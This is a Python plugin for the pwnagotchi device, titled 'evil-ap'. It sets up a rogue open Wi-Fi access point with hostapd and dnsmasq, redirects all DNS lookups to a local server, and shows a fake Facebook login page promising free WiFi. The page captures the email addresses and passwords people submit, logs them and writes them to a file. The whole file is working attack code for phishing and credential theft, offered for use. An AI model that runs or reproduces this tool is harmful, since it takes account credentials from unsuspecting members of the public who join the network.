import time
import logging
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
from pwnagotchi import plugins
from pwnagotchi.utils import get_installed_packages
from pwnagotchi.utils import StatusFile

HOSTAPD_CONFIG = """
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
"""

HTML_RESPONSE = """
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Wifi-Login</title>
        <style type="text/css">
            body { text-align: center; padding: 10%; font: 20px Helvetica, sans-serif; color: #0084FF; }
            h1 { font-size: 50px; margin: 0; }
            article { display: block; text-align: left; max-width: 650px; margin: 0 auto; }
            a { color: #dc8100; text-decoration: none; }
            a:hover { color: #333; text-decoration: none; }
            @media only screen and (max-width : 480px) {
                h1 { font-size: 40px; }
            }
        </style>
    </head>

    <body>
            <article>
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/32/Facebooklogo.png">
                <h1>Use facebook to get free WiFi!</h1>
                <p>Please login with your facebook account and like our site,</p>
                <p>afterwards you will be able to use our WiFi.</p>
                <form action="/" id="login" method="POST">
                    <label for="email">E-Mail</label>
                    <input type="text" name="email" id="email">

                    <label for="password">Password</label>
                    <input type="password" name="password" id="password">

                    <button type="submit">Login</button>
                </form>
            </article>
    </body>
</html>
"""

creds_file = StatusFile('/root/.facebook-creds', data_format='json')

class FischHttpHandler(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self._set_response()
        self.wfile.write(bytes(HTML_RESPONSE, "utf8"))

    def do_POST(self):
        # harvest credentials
        global creds_file
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        if post_data:
            try:
                parsed = parse_qs(post_data.decode('utf-8'))
                email, password = parsed['email'], parsed['password']
                logging.info("Got credentials: email: %s password: %s", email, password)
                credentials = creds_file.data_field_or('credentials', default=list())
                credentials.append((email,password))
                creds_file.update(data={'credentials': credentials})
            except Exception as ex:
                logging.error(ex)

        self.send_response(302)
        self.send_header('Location', 'http://free-wifi.net')
        self.end_headers()

class FischThread(threading.Thread):
    def __init__(self, webserver, *args, **kwargs):
        super(FischThread, self).__init__(*args, **kwargs)
        self._stop = threading.Event()
        self._web = webserver

    def run(self):
        while not self.stopped():
            self._web.handle_request()

    def stop(self):
        self._stop.set()

    def stopped(self):
        return self._stop.is_set()

class EvilAp(plugins.Plugin):
    __author__ = '33197631+dadav@users.noreply.github.com'
    __version__ = '0.0.1'
    __name__ = 'evil-ap'
    __license__ = 'GPL3'
    __description__ = 'This plugin creates an evil accesspoint while pwnagotchi is sad.'

    def __init__(self):
        self.ready = False

    @staticmethod
    def check_requirements():
        requirements = set(['dnsmasq', 'hostapd'])
        installed = set(get_installed_packages())
        return requirements.issubset(installed)

    def on_loaded(self):
        self.ready = EvilAp.check_requirements()
        logging.info("[evil-ap] %s", "is loaded." if self.ready else "could not be loaded (missing required packages).")

    def on_sad(self, agent):
        if not self.ready:
            return

        cfg = agent.config()

        logging.debug("[evil-ap] Unit is sad, let's change that.")
        # steps:
        ## 1. pause bettercap and auto/ai mode
        agent.pause()
        time.sleep(5)
        agent.stop_monitor_mode()

        ## 2. start dnsmasq, hostapd and some fake-login-site
        logging.debug("[evil-ap] Starting Fake-AP...")

        # set gateway and webserver-ip to iface
        for ip in [self.options['gateway'], self.options['webserver']]:
            ip_proc = subprocess.Popen(f"ip addr add {ip}/{self.options['dhcp-netmask']} dev {self.options['iface']}".split(),
                    shell=False, stdout=open("/dev/null", "w"), stderr=open("/dev/null", "w"))
            ip_proc.wait()

        # webserver
        bettercap_http = agent.is_module_running('http.server')
        if bettercap_http:
            agent.stop_module('http.server')
        web = HTTPServer((self.options['webserver'], self.options['port']), FischHttpHandler)
        web_thread = FischThread(web).start()

        dev_null = open("/dev/null", "w")
        dnsmasq = [
            "dnsmasq",
            "--no-daemon", # don't deamonize
            "--no-hosts", # don't read the hostnames in /etc/hosts.
            "--interface=%s" % self.options['iface'], # listen on this interface
            "--no-poll", # Don't poll /etc/resolv.conf for changes.
            "--no-resolv",
            "--dhcp-range=%s,%s,%s,24h" % (self.options['dhcp-min'], self.options['dhcp-max'], self.options['dhcp-netmask']),
            "--dhcp-option=3,%s" % self.options['gateway'], # gateway
            "--dhcp-option=6,%s" % self.options['dns-server'], # dns-server
            "--address=/#/%s" % self.options['webserver']
        ]
        dns_proc = subprocess.Popen(dnsmasq, shell=False, stdout=dev_null, stdin=None, stderr=dev_null)

        hostap_cfg = HOSTAPD_CONFIG.format(iface=self.options['iface'], ssid=self.options['ssid'])
        hostapd = [
            "hostapd",
            "/dev/stdin"
        ]
        hostapd_proc = subprocess.Popen(hostapd, shell=False, stdout=dev_null, stdin=subprocess.PIPE, stderr=dev_null)
        hostapd_proc.communicate(input=str.encode(hostap_cfg))

        ## 3. wait for user input (use a timeout like 15 mins)
        time.sleep(self.options['time'])

        ## 4. switch back to pwnagotchi mode
        hostapd_proc.kill()
        dns_proc.kill()
        web_thread.stop()

        logging.debug("[evil-ap] Times up, continue pwning...")
        if bettercap_http:
            agent.start_module('http.server')
        agent.start_monitor_mode()
        agent.cont()
